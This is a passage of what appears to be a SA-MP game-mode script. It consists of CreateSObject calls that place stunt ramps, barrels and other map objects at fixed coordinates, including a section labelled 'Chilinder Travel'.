	CreateSObject(4113, 1485.595215, -2452.362793, 44.583294, 0.0000, 0.0000, 278.6717,object_show_distance,-1,world_wstunts);
	CreateSObject(9833, 1768.065308, -2483.028809, 9.107267, 0.0000, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(9833, 1767.843872, -2492.562744, 9.257273, 0.0000, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(9833, 1767.983276, -2503.221924, 9.232254, 0.0000, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(619, 1775.529419, -2513.422852, 12.696268, 0.0000, 0.0000, 258.7500,object_show_distance,-1,world_wstunts);
	CreateSObject(619, 1776.331909, -2473.912598, 12.704080, 0.0000, 0.0000, 11.2500,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1787.111816, -2490.128418, 13.627008, 0.0000, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1787.152466, -2494.187744, 13.652008, 0.0000, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1787.169678, -2498.305908, 13.677008, 0.0000, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1793.848877, -2490.158691, 18.191860, 17.1887, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1793.836304, -2494.152100, 18.190126, 17.1887, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1793.833496, -2498.284424, 18.211977, 17.1887, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1798.429443, -2490.085693, 24.391483, 38.6747, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1798.411865, -2494.104736, 24.377995, 38.6747, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1798.387085, -2498.208008, 24.347824, 38.6747, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(17563, 1422.695801, -2440.656250, 8.502556, 0.0000, 0.0000, 292.5000,object_show_distance,-1,world_wstunts);
	CreateSObject(13592, 2117.211182, -2468.809814, 22.217510, 0.0000, 0.0000, 8.6717,object_show_distance,-1,world_wstunts);
	CreateSObject(13592, 2117.156982, -2461.388672, 22.142485, 0.0000, 0.0000, 8.6717,object_show_distance,-1,world_wstunts);
	CreateSObject(13592, 2117.291992, -2454.042969, 22.017479, 0.0000, 0.0000, 8.6717,object_show_distance,-1,world_wstunts);
	CreateSObject(13592, 2117.225342, -2446.572998, 22.017483, 0.0000, 0.0000, 8.6717,object_show_distance,-1,world_wstunts);
	CreateSObject(13592, 2117.263184, -2439.214844, 21.992487, 0.0000, 0.0000, 8.6717,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 2124.205811, -2434.376221, 13.569197, 0.0000, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 2130.798828, -2434.370605, 18.742977, 24.0642, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 2134.310303, -2434.354248, 25.329052, 48.9878, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 2134.613281, -2434.356201, 33.642532, 75.6304, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 2130.271729, -2434.427490, 40.183571, 116.0238, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1521.212402, -2453.019043, 13.604692, 0.0000, 0.0000, 90.0001,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1514.139038, -2453.020752, 18.141373, 14.6104, 0.0000, 90.0001,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1508.383789, -2453.030518, 24.902443, 33.5180, 0.0000, 90.0001,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1505.082764, -2453.010498, 32.802406, 50.7067, 0.0000, 90.0001,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1504.012207, -2452.991699, 40.298409, 62.7388, 0.0000, 90.0001,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1504.622437, -2452.990723, 48.479057, 75.6304, 0.0000, 90.0001,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1506.877808, -2452.966064, 55.953350, 87.6625, 0.0000, 90.0001,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1510.870728, -2452.937500, 63.051414, 100.5540, 0.0000, 90.0001,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1515.063843, -2452.824707, 67.708916, 113.4455, 0.0000, 90.0001,object_show_distance,-1,world_wstunts);
	CreateSObject(8355, 1588.067627, -2450.075195, 61.816883, 0.0000, 0.0000, 270.8595,object_show_distance,-1,world_wstunts);
	CreateSObject(7617, 2145.948242, -2537.311523, 24.484514, 0.0000, 0.0000, 90.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 2130.901123, -2533.061523, 13.619196, 0.0000, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 2130.983887, -2537.199707, 13.644196, 0.0000, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 2130.974854, -2541.395752, 13.644196, 0.0000, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 2138.205078, -2533.072998, 18.350368, 15.4699, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 2138.202393, -2537.223145, 18.350979, 15.4699, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 2138.103760, -2541.395020, 18.296383, 15.4699, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 2142.159668, -2533.088379, 24.832253, 47.2690, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 2142.149170, -2537.217285, 24.855282, 47.2690, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 2142.160156, -2541.392334, 24.864799, 47.2690, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 2142.118408, -2533.122803, 32.985199, 81.6464, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 2142.120117, -2537.235107, 32.987492, 81.6464, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 2142.110840, -2541.339355, 32.983742, 81.6464, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(8493, 2007.506470, -2544.564209, 31.319046, 0.0000, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(14414, 1996.977173, -2534.511963, 15.831310, 0.0000, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(5130, 1996.801758, -2554.905273, 15.836042, 0.0000, 0.0000, 226.7189,object_show_distance,-1,world_wstunts);
	CreateSObject(16776, 1970.243164, -2392.609375, 14.297718, 0.0000, 0.0000, 273.4378,object_show_distance,-1,world_wstunts);
	CreateSObject(13593, 1971.332397, -2425.260986, 13.639748, 14.6104, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(13643, 1906.650757, -2306.174316, 13.642895, 0.0000, 0.0000, 179.1406,object_show_distance,-1,world_wstunts);
	CreateSObject(13636, 1881.386963, -2298.198975, 14.702261, 0.0000, 0.0000, 90.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(13638, 1894.472900, -2282.010742, 16.794302, 0.0000, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(13638, 1903.215820, -2290.172852, 16.794306, 0.0000, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(13604, 1918.284912, -2286.969482, 14.254889, 0.0000, 0.0000, 134.4495,object_show_distance,-1,world_wstunts);
	CreateSObject(18225, 1887.311035, -2241.211426, 27.046375, 0.0000, 0.0000, 71.9518,object_show_distance,-1,world_wstunts);
	CreateSObject(18225, 1946.401489, -2242.445068, 27.091393, 0.0000, 0.0000, 41.4849,object_show_distance,-1,world_wstunts);
	CreateSObject(18225, 1988.886719, -2242.898682, 30.566397, 0.0000, 0.0000, 53.6717,object_show_distance,-1,world_wstunts);
	CreateSObject(8483, 1926.326538, -2268.807129, 18.178202, 0.0000, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(622, 1914.240356, -2252.254639, 32.706158, 0.0000, 0.0000, 191.2500,object_show_distance,-1,world_wstunts);
	CreateSObject(622, 1959.036255, -2258.686768, 34.324825, 0.0000, 0.0000, 135.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(622, 1991.791138, -2257.061768, 37.843754, 0.0000, 0.0000, 213.7500,object_show_distance,-1,world_wstunts);
	CreateSObject(622, 1870.343140, -2262.503174, 35.378788, 0.0000, 0.0000, 168.7499,object_show_distance,-1,world_wstunts);
	CreateSObject(7916, 1872.461548, -2269.835205, 15.911491, 0.0000, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(7916, 1963.374390, -2278.580566, 14.885624, 0.0000, 0.0000, 11.2500,object_show_distance,-1,world_wstunts);
	CreateSObject(9831, 1926.461304, -2272.293701, 15.983534, 320.4659, 358.2811, 186.9528,object_show_distance,-1,world_wstunts);
	CreateSObject(3461, 1923.286011, -2275.252686, 17.723564, 39.5341, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(3461, 1927.303223, -2274.806641, 17.783621, 39.5341, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(3665, 1891.895874, -2544.788330, 22.708633, 18.0482, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(3665, 1897.302246, -2545.018066, 28.402870, 21.4859, 0.0000, 269.1406,object_show_distance,-1,world_wstunts);
	CreateSObject(13641, 1592.481567, -2620.257813, 14.266119, 0.0000, 0.0000, 180.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(3168, 1552.411011, -2621.790283, 12.476540, 0.0000, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(3171, 1540.500366, -2621.432617, 12.476540, 0.0000, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(3172, 1528.292480, -2621.830811, 12.469587, 0.0000, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(3174, 1515.605469, -2620.219727, 12.500658, 0.0000, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(3175, 1503.674805, -2621.514648, 12.378308, 0.0000, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(3168, 1492.174194, -2620.847412, 12.426540, 0.0000, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(13592, 1656.268799, -2468.476807, 71.316833, 8.5944, 0.0000, 278.6717,object_show_distance,-1,world_wstunts);
	CreateSObject(13592, 1663.519653, -2468.466553, 72.325264, 8.5944, 0.0000, 278.6717,object_show_distance,-1,world_wstunts);
	CreateSObject(13592, 1670.613892, -2468.555908, 73.309433, 8.5944, 0.0000, 278.6717,object_show_distance,-1,world_wstunts);
	CreateSObject(13592, 1677.869019, -2468.615967, 74.351135, 8.5944, 0.0000, 278.6717,object_show_distance,-1,world_wstunts);
	CreateSObject(8355, 1703.579590, -2535.893555, 64.034088, 359.1406, 0.0000, 183.4378,object_show_distance,-1,world_wstunts);
	CreateSObject(13592, 1723.440796, -2599.539551, 71.701309, 25.7831, 0.0000, 278.6717,object_show_distance,-1,world_wstunts);
	CreateSObject(13592, 1730.226807, -2599.514893, 74.880196, 25.7831, 0.0000, 278.6717,object_show_distance,-1,world_wstunts);
	CreateSObject(13592, 1736.844727, -2599.911865, 78.254959, 25.7831, 0.0000, 278.6717,object_show_distance,-1,world_wstunts);
	CreateSObject(13592, 1743.390015, -2600.169189, 81.405457, 25.7831, 0.0000, 278.6717,object_show_distance,-1,world_wstunts);
	CreateSObject(13592, 1750.000244, -2600.231445, 84.471375, 25.7831, 0.0000, 278.6717,object_show_distance,-1,world_wstunts);
	CreateSObject(13592, 1756.619019, -2600.322998, 87.667534, 25.7831, 0.0000, 278.6717,object_show_distance,-1,world_wstunts);
	CreateSObject(13592, 1763.355469, -2600.526367, 90.719063, 25.7831, 0.0000, 278.6717,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1771.268311, -2609.725830, 84.232002, 0.0000, 20.6265, 180.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1770.136230, -2613.619141, 87.836464, 29.2208, 17.1887, 171.4056,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1769.012573, -2615.690186, 94.296501, 59.3011, 12.8916, 169.6867,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1768.391479, -2614.952148, 102.459785, 79.9276, 12.8916, 166.2489,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1768.822266, -2611.065430, 108.227997, 118.6022, 5.1566, 160.2328,object_show_distance,-1,world_wstunts);
	CreateSObject(7392, 2004.835938, -2317.778320, 28.742146, 0.0000, 0.0000, 56.2500,object_show_distance,-1,world_wstunts);
	CreateSObject(7073, 1889.145508, -2642.276855, 43.760654, 0.0000, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1963.521851, -2650.465576, 13.594196, 0.0000, 0.0000, 90.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1932.206543, -2650.845947, 30.219187, 30.9397, 0.0000, 90.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1879.696777, -2652.046631, 26.336542, 0.0000, 0.0000, 90.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1812.393066, -2665.713379, 26.347055, 0.0000, 0.0000, 90.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1792.576904, -2665.723877, 35.344193, 18.0482, 0.0000, 90.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1743.766846, -2648.433594, 26.428284, 0.0000, 0.0000, 90.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1672.496582, -2661.081787, 26.602684, 0.0000, 0.0000, 90.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1634, 1606.996094, -2646.699951, 26.539131, 0.0000, 0.0000, 90.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(1383, 1541.185913, -2552.606445, 45.077179, 0.0000, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(6052, 1541.469727, -2560.428711, 16.919519, 346.2490, 0.0000, 33.7500,object_show_distance,-1,world_wstunts);
	CreateSObject(6052, 1553.247925, -2552.540527, 25.836859, 346.2490, 0.0000, 135.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(6052, 1545.349976, -2545.714600, 34.219551, 346.2490, 0.0000, 255.7078,object_show_distance,-1,world_wstunts);
	CreateSObject(6052, 1543.710205, -2557.599121, 42.728577, 346.2490, 0.0000, 12.4277,object_show_distance,-1,world_wstunts);
	CreateSObject(6052, 1554.007690, -2553.809082, 51.144604, 346.2490, 0.0000, 138.6788,object_show_distance,-1,world_wstunts);
	CreateSObject(6052, 1543.656128, -2546.010986, 59.833172, 346.2490, 0.0000, 251.1787,object_show_distance,-1,world_wstunts);
	CreateSObject(6052, 1541.563354, -2556.270020, 68.250633, 346.2490, 0.0000, 14.9288,object_show_distance,-1,world_wstunts);
	CreateSObject(3666, 1541.494141, -2552.644043, 20.656319, 0.0000, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(3666, 1541.744141, -2552.576904, 31.381685, 0.0000, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(3666, 1541.854980, -2552.641602, 42.503086, 0.0000, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(3666, 1541.313477, -2552.699219, 52.617149, 0.0000, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(3666, 1542.494141, -2552.450684, 61.606186, 0.0000, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(3666, 1542.494141, -2552.521240, 72.226685, 0.0000, 0.0000, 0.0000,object_show_distance,-1,world_wstunts);
	CreateSObject(3627, 1645.527710, -2415.158936, 16.394175, 0.0000, 0.0000, 270.0000,object_show_distance,-1,world_wstunts);
	// 0.4.5 - Chilinder Travel:
	CreateSObject(1454, -2289.802734, -2154.810059, 47.824593, 0.0000, 0.0000, 303.7500);
	CreateSObject(1454, -2270.955811, -2149.188232, 53.598648, 12.8916, 359.1406, 303.7500);
	CreateSObject(1454, -2245.965088, -2128.015869, 63.157101, 12.8916, 0.0000, 0.0000);
	CreateSObject(1454, -2232.750000, -2113.152100, 68.690781, 0.0000, 0.0000, 292.5000);
	CreateSObject(1454, -2217.065918, -2100.777100, 73.697647, 0.0000, 0.0000, 292.5000);
	CreateSObject(1454, -2204.756836, -2083.603027, 78.538879, 0.0000, 0.0000, 292.5000);
	CreateSObject(1454, -2193.332764, -2073.489502, 81.913452, 0.0000, 0.0000, 292.5000);
	CreateSObject(1454, -2182.770020, -2064.115479, 85.002464, 0.0000, 0.0000, 292.5000);
	CreateSObject(1454, -2171.064941, -2047.369873, 89.498001, 0.0000, 0.0000, 292.5000);
	CreateSObject(1454, -2156.129639, -2026.615845, 93.033783, 0.0000, 0.0000, 292.5000);
	CreateSObject(1454, -2132.846191, -1987.788452, 96.595581, 0.0000, 0.0000, 292.5000);
	CreateSObject(1454, -2123.710693, -1962.476685, 98.294724, 0.0000, 0.0000, 292.5000);
	CreateSObject(1454, -2113.497070, -1941.450439, 100.559654, 0.0000, 0.0000, 292.5000);
	CreateSObject(1454, -2109.774902, -1927.300293, 101.865143, 0.0000, 0.0000, 292.5000);
	CreateSObject(1454, -2107.760986, -1912.673340, 104.198944, 0.0000, 0.0000, 292.5000);
	CreateSObject(1454, -2097.905029, -1893.394775, 109.384018, 0.0000, 0.0000, 292.5000);
	CreateSObject(1225, -2125.694336, -1952.844360, 99.806206, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2127.289551, -1940.842407, 102.261147, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2120.505127, -1935.751587, 101.358391, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2124.746582, -1925.054199, 106.071098, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2117.160645, -1928.653564, 101.753777, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2119.628418, -1920.137695, 106.863228, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2124.180420, -1914.310547, 112.316032, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2115.836426, -1909.885742, 109.227325, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2113.247803, -1916.961426, 104.094124, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2109.207031, -1901.967773, 108.527962, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2111.424805, -1909.700684, 106.480537, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2116.824951, -1902.494507, 111.421280, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2121.269531, -1908.574951, 112.712120, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2106.229248, -1889.791992, 109.644653, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2125.480469, -1953.415405, 98.487953, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2122.184326, -1942.419312, 99.885612, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2122.968018, -1926.437988, 103.780930, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2122.551270, -1933.613525, 99.843208, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2119.105225, -1937.139771, 99.619194, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2116.630859, -1928.661865, 99.932129, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2116.617432, -1913.543823, 106.045013, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2115.930420, -1918.838135, 103.163574, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2111.419434, -1913.268188, 103.269257, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2113.367676, -1919.042480, 101.908203, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2113.477783, -1905.137329, 106.769485, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2108.284668, -1900.606079, 106.620735, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2112.751465, -1907.998535, 106.685318, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2110.677979, -1908.880493, 104.824142, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2105.745850, -1887.938843, 106.687210, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2107.811035, -1892.451904, 106.874878, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2123.785400, -1911.417114, 108.790550, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2119.038574, -1903.463745, 108.909096, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2114.378418, -1899.337158, 106.873398, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2123.947998, -1916.839600, 108.113579, 0.0000, 0.0000, 0.0000);
	CreateSObject(3437, -2118.599609, -1883.180176, 120.026894, 88.5219, 23.2048, 299.3755);
	CreateSObject(3437, -2120.784180, -1886.439697, 122.992355, 122.0400, 24.0642, 318.3604);
	CreateSObject(3437, -2118.898193, -1887.522217, 117.430710, 57.5822, 20.6265, 300.2349);
	CreateSObject(3437, -2111.954834, -1874.687744, 119.766548, 88.5219, 23.2048, 299.3755);
	CreateSObject(1454, -2134.054199, -1925.037109, 116.421242, 0.0000, 0.0000, 225.0000);
	CreateSObject(1454, -2141.448730, -1944.920898, 117.449646, 0.0000, 0.0000, 225.0000);
	CreateSObject(1454, -2149.247559, -1968.132446, 118.131454, 0.0000, 0.0000, 225.0000);
	CreateSObject(1454, -2160.335693, -1978.952881, 117.738113, 0.0000, 0.0000, 225.0000);
	CreateSObject(1454, -2163.646973, -1989.174316, 118.364563, 0.0000, 0.0000, 225.0000);
	CreateSObject(1454, -2189.259521, -2006.546143, 119.147545, 0.0000, 0.0000, 225.0000);
	CreateSObject(1454, -2206.206787, -2035.437500, 119.549240, 0.0000, 0.0000, 225.0000);
	CreateSObject(1454, -2230.406982, -2056.006104, 119.776840, 0.0000, 0.0000, 225.0000);
	CreateSObject(1454, -2255.086182, -2074.363281, 120.151611, 0.0000, 0.0000, 225.0000);
	CreateSObject(3374, -2302.408447, -2085.380615, 117.349281, 0.0000, 0.0000, 22.5000);
	CreateSObject(3374, -2330.386475, -2093.398193, 115.750183, 0.0000, 0.0000, 22.5000);
	CreateSObject(3374, -2354.519043, -2094.143311, 114.756561, 0.0000, 0.0000, 22.5000);
	CreateSObject(3374, -2374.018066, -2096.913818, 116.345428, 0.0000, 0.0000, 22.5000);
	CreateSObject(3374, -2398.516846, -2087.531982, 120.544586, 0.0000, 0.0000, 22.5000);
	CreateSObject(1454, -2282.658936, -2082.966797, 117.806557, 0.0000, 0.0000, 225.0000);
	CreateSObject(1454, -2314.777832, -2096.314941, 115.375092, 0.0000, 0.0000, 225.0000);
	CreateSObject(1454, -2345.830566, -2102.300049, 112.847519, 0.0000, 0.0000, 225.0000);
	CreateSObject(1454, -2385.838623, -2099.780518, 116.725906, 0.0000, 0.0000, 225.0000);
	CreateSObject(1454, -2422.257080, -2092.231934, 121.807289, 0.0000, 0.0000, 225.0000);
	CreateSObject(1225, -2391.541504, -2103.397705, 116.987183, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2401.023438, -2101.307617, 117.564827, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2416.954102, -2100.910645, 118.737106, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2429.875244, -2093.898438, 121.602928, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2431.082275, -2099.522949, 119.136246, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2436.293213, -2091.165527, 123.361786, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2442.998779, -2089.354004, 124.353195, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2455.190186, -2082.057617, 124.245773, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2456.234131, -2083.937256, 124.290031, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2454.050781, -2085.827881, 124.296890, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2643.078369, -1733.425781, 258.868134, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2640.322021, -1736.474365, 259.399078, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2634.397461, -1744.284180, 260.275299, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2628.343750, -1754.589722, 260.768311, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2621.156738, -1766.859497, 260.827759, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2615.785156, -1776.464844, 260.942047, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2609.559326, -1787.432373, 261.336151, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2602.822510, -1799.661987, 262.595276, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2595.964111, -1811.324951, 265.268158, 0.0000, 0.0000, 0.0000);
	CreateSObject(3374, -2655.184326, -1722.633667, 257.596680, 0.0000, 0.0000, 22.5000);
	CreateSObject(3374, -2651.775635, -1721.431885, 257.900543, 0.0000, 0.0000, 22.5000);
	CreateSObject(3374, -2655.309814, -1722.607910, 260.596680, 0.0000, 0.0000, 22.5000);
	CreateSObject(3374, -2651.780273, -1721.379395, 260.725586, 0.0000, 0.0000, 22.5000);
	CreateSObject(3374, -2658.408936, -1723.885864, 257.474457, 0.0000, 0.0000, 22.5000);
	CreateSObject(3374, -2658.549072, -1723.914917, 260.474457, 0.0000, 0.0000, 22.5000);
	CreateSObject(3437, -2637.696045, -1728.744873, 267.659943, 0.0000, 264.6026, 337.5000);
	CreateSObject(3437, -2631.254395, -1734.558105, 268.340210, 10.3132, 263.7431, 306.5603);
	CreateSObject(3437, -2629.292236, -1738.993896, 274.124084, 10.3132, 283.5102, 306.5603);
	CreateSObject(3437, -2629.483398, -1740.213989, 267.120148, 10.3132, 230.2251, 323.7490);
	CreateSObject(3374, -2553.331299, -1870.169556, 287.584045, 0.0000, 0.0000, 45.0000);
	CreateSObject(3374, -2537.828369, -1875.660645, 291.187927, 0.0000, 0.0000, 45.0000);
	CreateSObject(1225, -2532.551270, -1870.319824, 295.957825, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2529.898193, -1878.874146, 293.267273, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2524.311279, -1883.730591, 294.117798, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2525.966797, -1873.066528, 298.050629, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2521.947754, -1875.925415, 298.275299, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2526.057861, -1865.622192, 301.059570, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2528.674316, -1881.396484, 290.859436, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2523.386719, -1883.691040, 291.837097, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2532.297119, -1869.863403, 294.709229, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2524.921387, -1874.883789, 294.657257, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2521.697021, -1875.985962, 295.631348, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2526.447754, -1865.785400, 299.512238, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2531.615479, -1876.034424, 290.336212, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2528.687988, -1875.270996, 291.472839, 0.0000, 0.0000, 0.0000);
	CreateSObject(1454, -2519.357178, -1868.620605, 301.558655, 0.0000, 0.0000, 225.0000);
	CreateSObject(1454, -2534.402344, -1846.273193, 308.345642, 0.0000, 0.0000, 225.0000);
	CreateSObject(1454, -2559.419678, -1824.533447, 314.141052, 0.0000, 0.0000, 225.0000);
	CreateSObject(1454, -2585.405518, -1795.820068, 317.663666, 0.0000, 0.0000, 225.0000);
	CreateSObject(1454, -2590.928223, -1772.160889, 319.384277, 0.0000, 0.0000, 225.0000);
	CreateSObject(1454, -2603.995361, -1741.897949, 321.397064, 0.0000, 0.0000, 225.0000);
	CreateSObject(1454, -2605.285400, -1702.501709, 326.950989, 0.0000, 0.0000, 225.0000);
	CreateSObject(1454, -2604.728271, -1647.609497, 339.609039, 0.0000, 0.0000, 225.0000);
	CreateSObject(1454, -2599.416748, -1646.528809, 340.695740, 0.0000, 0.0000, 225.0000);
	CreateSObject(1454, -2603.681152, -1666.970825, 335.960327, 0.0000, 0.0000, 225.0000);
	CreateSObject(1225, -2589.615479, -1637.137817, 344.935425, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2592.608398, -1645.615723, 344.489807, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2587.498779, -1642.982300, 346.907104, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2593.618896, -1638.505859, 342.341644, 0.0000, 0.0000, 0.0000);
	CreateSObject(1225, -2590.154541, -1650.090576, 347.203766, 0.0000, 0.0000, 0.0000);
	CreateSObject(2780, -2592.568848, -1640.727539, 340.066620, 0.0000, 0.0000, 0.0000);
